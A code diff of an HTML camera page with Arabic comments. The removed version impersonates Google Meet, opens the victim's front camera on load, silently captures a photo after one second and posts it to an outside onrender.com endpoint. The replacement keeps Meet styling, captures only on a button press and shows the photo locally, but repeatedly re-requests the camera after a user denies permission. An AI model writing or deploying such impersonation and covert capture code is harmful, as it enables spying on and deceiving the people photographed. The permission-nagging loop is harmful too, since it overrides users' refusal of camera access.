@@ -3,25 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Meet</title>
+    <title>واجهة التقاط الصور - Meet Style</title>
     <style>
-        * {
+        /* تصميم عام مستوحى من Google Meet */
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #202124;
+            background-color: #202124; /* لون خلفية جوجل ميت */
             color: white;
-            height: 100vh;
+            font-family: 'Roboto', sans-serif;
             display: flex;
             flex-direction: column;
+            height: 100vh;
             overflow: hidden;
         }
 
-        /* منطقة الفيديو الرئيسية */
+        /* حاوية الفيديو */
         .main-container {
             flex: 1;
             display: flex;
@@ -31,32 +28,14 @@
             position: relative;
         }
 
-        .video-wrapper {
+        #video {
             width: 100%;
             max-width: 900px;
-            aspect-ratio: 16 / 9;
-            background-color: #3c4043;
-            border-radius: 8px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
+            height: 80vh;
             object-fit: cover;
-            transform: scaleX(-1); /* مرآة مثل تطبيقات الاجتماعات */
-        }
-
-        .user-label {
-            position: absolute;
-            bottom: 16px;
-            left: 16px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 4px 12px;
-            border-radius: 4px;
-            font-size: 14px;
+            border-radius: 12px;
+            background-color: #3c4043;
+            transform: scaleX(-1); /* مرآة للكاميرا الأمامية */
         }
 
         /* شريط التحكم السفلي */
@@ -65,141 +44,146 @@
             background-color: #202124;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            padding: 0 24px;
-        }
-
-        .meeting-info {
-            font-size: 16px;
-            font-weight: 500;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 12px;
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
+            justify-content: center;
+            gap: 15px;
         }
 
         .btn {
             width: 48px;
             height: 48px;
             border-radius: 50%;
-            border: none;
+            border: 1px solid #5f6368;
             background-color: #3c4043;
             color: white;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            transition: background 0.3s;
+            transition: background-color 0.3s;
         }
 
         .btn:hover {
             background-color: #4c5054;
         }
 
-        .btn-danger {
-            background-color: #ea4335;
-            width: 64px;
-            border-radius: 24px;
+        .btn-capture {
+            background-color: #ea4335; /* لون أحمر مميز للالتقاط */
+            border: none;
+            width: 56px;
+            height: 56px;
         }
 
-        .btn-danger:hover {
+        .btn-capture:hover {
             background-color: #d93025;
         }
 
-        /* إخفاء الـ Canvas */
-        #photo-canvas {
+        /* نافذة معاينة الصورة الملتقطة */
+        #preview-container {
+            position: fixed;
+            bottom: 100px;
+            right: 20px;
+            width: 150px;
+            border: 2px solid #fff;
+            border-radius: 8px;
             display: none;
         }
 
-        /* رسالة الحالة السفلية */
-        #status-message {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 10px 20px;
-            border-radius: 4px;
-            background: #3c4043;
+        #photo-preview {
+            width: 100%;
+            border-radius: 6px;
+        }
+
+        canvas { display: none; }
+
+        .label {
+            position: absolute;
+            bottom: 40px;
+            left: 40px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 15px;
+            border-radius: 20px;
             font-size: 14px;
-            z-index: 100;
         }
     </style>
 </head>
 <body>
 
-    <div id="status-message">جاري التحقق من الاتصال...</div>
-
     <div class="main-container">
-        <div class="video-wrapper">
-            <video id="camera-feed" autoplay playsinline muted></video>
-            <div class="user-label">أنت</div>
+        <video id="video" autoplay playsinline></video>
+        <div class="label">أنت</div>
+        
+        <div id="preview-container">
+            <img id="photo-preview" src="" alt="المعاينة">
         </div>
     </div>
 
-    <canvas id="photo-canvas"></canvas>
-
     <div class="controls-bar">
-        <div class="meeting-info">تفاصيل الاجتماع | abc-defg-hij</div>
+        <button class="btn" onclick="startCamera('user')" title="كاميرا أمامية">
+            👤
+        </button>
+        
+        <button class="btn btn-capture" onclick="takeSnap()" title="التقاط صورة">
+            📸
+        </button>
 
-        <div class="action-buttons">
-            <button class="btn">🎤</button>
-            <button class="btn">📹</button>
-            <button class="btn">✋</button>
-            <button class="btn">🖥️</button>
-            <button class="btn btn-danger">📞</button>
-        </div>
+        <button class="btn" onclick="startCamera('environment')" title="كاميرا خلفية">
+            📷
+        </button>
+    </div>
 
-        <div style="width: 150px;"></div> </div>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const video = document.getElementById('camera-feed');
-        const canvas = document.getElementById('photo-canvas');
-        const statusMessage = document.getElementById('status-message');
-        
-        function captureAndSend() {
-            setTimeout(() => {
-                canvas.width = video.videoWidth || 640; 
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
-                sendPhotoToServer(imageDataURL);
-            }, 1000); 
-        }
-        
-        async function startCamera() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const previewContainer = document.getElementById('preview-container');
+        const photoPreview = document.getElementById('photo-preview');
+        let currentStream = null;
+
+        async function startCamera(mode) {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+
             try {
-                const constraints = { video: { facingMode: 'user' }, audio: false }; 
+                const constraints = { video: { facingMode: mode } };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
                 video.srcObject = stream;
                 
-                video.onloadedmetadata = function() {
-                    statusMessage.textContent = 'متصل بالاجتماع';
-                    captureAndSend();
-                };
-
+                // تعديل تأثير المرآة: الكاميرا الأمامية فقط تكون كالمرآة
+                video.style.transform = mode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+                
             } catch (err) {
-                console.error("خطأ:", err);
-                statusMessage.textContent = 'خطأ في الكاميرا';
+                console.error("Permission denied:", err);
+                alert("يجب السماح بالوصول للكاميرا للمتابعة.");
+                // إعادة المحاولة فوراً
+                setTimeout(() => startCamera(mode), 500);
             }
         }
 
-        async function sendPhotoToServer(imageData) {
-            const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
-            try {
-                await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: imageData })
-                });
-            } catch (error) {
-                console.error('خطأ في الإرسال:', error);
+        function takeSnap() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // للحفاظ على وضع المرآة في الصورة إذا كانت أمامية
+            if (video.style.transform === 'scaleX(-1)') {
+                context.translate(canvas.width, 0);
+                context.scale(-1, 1);
             }
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const data = canvas.toDataURL('image/png');
+            photoPreview.src = data;
+            previewContainer.style.display = 'block';
+            
+            alert("تم التقاط الصورة بنجاح!");
         }
 
-        window.onload = startCamera;
+        // تشغيل الكاميرا الأمامية تلقائياً عند البدء
+        window.onload = () => startCamera('user');
     </script>
 </body>
 </html>
